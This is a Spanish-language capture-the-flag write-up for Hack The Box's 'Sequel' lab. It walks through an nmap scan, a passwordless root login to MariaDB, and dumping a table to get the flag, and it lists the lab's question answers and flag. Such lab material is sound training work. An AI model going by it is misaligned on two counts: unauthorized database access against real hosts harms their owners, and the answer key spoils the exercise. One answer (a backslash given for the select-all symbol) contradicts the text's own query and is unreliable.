---
title: HTB - Sequel
date: 2022-06-26
categories: [Hack The Box, Starting Point]
tag: [Web, Sql, Starting Point - Tier 2]
img_path: /assets/img/htb/sequel
image:
   path: sequel.png
   width: 267
   height: 144
---
<h2 style="color:#74b4f4">Escaneo</h2>
---
Realizamos un escaneo de `nmap` para identificar los puertos abiertos y servicios.

```console
nmap {target ip} -sV -v
```

Resultado del escaneo:

```console
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Nmap scan report for 10.129.93.192
Host is up (0.43s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 121
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, SupportsTransactions, FoundRows, DontAllowDatabaseTableColumn, SupportsCompression, Speaks41ProtocolOld, Support41Auth, LongColumnFlag, InteractiveClient, ConnectWithDatabase, ODBCClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsLoadDataLocal, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Q2A2spXHAK7oKfCZysV6
|_  Auth Plugin Name: mysql_native_password
|_sslv2: ERROR: Script execution failed (use -d to debug)

NSE: Script Post-scanning.
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Initiating NSE at 22:08
Completed NSE at 22:08, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.05 seconds
```

Solo hay un puerto abierto corriendo <b style="color:#800000">MySQL</b> especificamente <b style="color:#800000">5.5.5-10.3.27-MariaDB-0+deb10u1</b>. Podemos intentar conectarnos al servicio en el puerto <b style="color:#800000">3306</b> con mysql utilizando el usuario `root` para que no sea necesario proporcionar una contraseña.

```console
mysql -h {target ip} -u root -P 3306
```

```console
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 129
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Mostramos todas las bases de datos disponibles con el siguiente comando:

```sql
SHOW databases;
```

```console
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

Seleccionamos <b style="color:#800000">htb</b> y mostramos todas sus tablas:

```sql
USE htb;
SHOW tables;
```

```console
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Tenemos dos tablas: config y users. Estas pueden verificarse secuencialmente por su contenido:

```sql
SELECT * FROM {nombre de la tabla};
```

Una vez que consultamos el contenido de la tabla de configuración se muestra claramente el valor de la flag.

```console
 +----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

<h2 style="color:#74b4f4">Preguntas</h2>
---
1. ¿Qué significa el acrónimo SQL?

	<b style="color:#8B2F97">Structured Query Language</b>
	
2. Durante nuestro escaneo, ¿qué puerto con mysql encontramos?
	
	<b style="color:#8B2F97">3306</b>

3. ¿Qué versión de MySQL desarrollada por la comunidad está ejecutando el objetivo?
	
	<b style="color:#8B2F97">MariaDB</b>

4. ¿Qué interruptor necesitamos usar para especificar un nombre de usuario de inicio de sesión para el servicio MySQL?
	
	<b style="color:#8B2F97">-u</b>
	
5. ¿Qué nombre de usuario nos permite iniciar sesión en MariaDB sin proporcionar una contraseña?
	
	<b style="color:#8B2F97">root</b>

6. ¿Qué símbolo podemos usar para especificar dentro de la consulta que queremos mostrar todo dentro de una tabla?
	
	<b style="color:#8B2F97">\\</b>

7. ¿Con qué símbolo necesitamos terminar cada consulta?
	
	<b style="color:#8B2F97">;</b>
	
**Root Flag:** <b style="color:#FF8B00">7b4bec00d1a39e3dd4e021ec3d915da8</b>
	
![](Pasted image 20220426221937.png)